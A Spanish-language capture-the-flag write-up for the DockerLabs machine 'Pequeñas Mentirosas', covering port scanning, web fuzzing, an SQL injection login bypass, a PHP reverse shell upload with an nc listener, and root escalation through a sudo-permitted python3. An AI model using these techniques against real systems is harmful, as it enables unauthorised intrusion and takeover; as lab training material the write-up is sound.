---
layout: writeup
title: "Pequeñas Mentirosas"
platform: dockerlabs
difficulty: very-easy
os: linux
date: 2026-03-24
tags: [fuzzing, sqli, privesc, sudo, Alvaro Escri]
description: "Máquina fácil de DockerLabs. Enumeración web, SQLi en login y escalada con sudo."
---

## Reconocimiento

Empezamos con un escaneo de puertos para ver qué tenemos:

```bash
nmap -sV -sC -p- --min-rate 5000 10.10.11.X -oN scan.txt
```

**Resultado:**
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.51
22/tcp open  ssh     OpenSSH 8.4p1
```

## Enumeración Web

Accedemos al puerto 80 y encontramos un panel de login. Tiramos feroxbuster para buscar más rutas:

```bash
feroxbuster -u http://10.10.11.X -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Encontramos `/admin`, `/backup` y `/config.php`.

## Explotación

El panel de login es vulnerable a SQLi básica:

```
Usuario: admin' -- -
Password: anything
```

Entramos directamente como admin. Desde el panel podemos subir archivos — subimos una reverse shell PHP.

```bash
nc -lvnp 4444
```

## Escalada de Privilegios

Comprobamos sudo:

```bash
sudo -l
```

```
(ALL) NOPASSWD: /usr/bin/python3
```

¡Perfecto! Escalamos a root:

```bash
sudo python3 -c 'import os; os.system("/bin/bash")'
```

```
root@pequeñas-mentirosas:~# id
uid=0(root) gid=0(root)
```

## Flags

```
User: 7a9f3c...
Root: b3e12d...
```
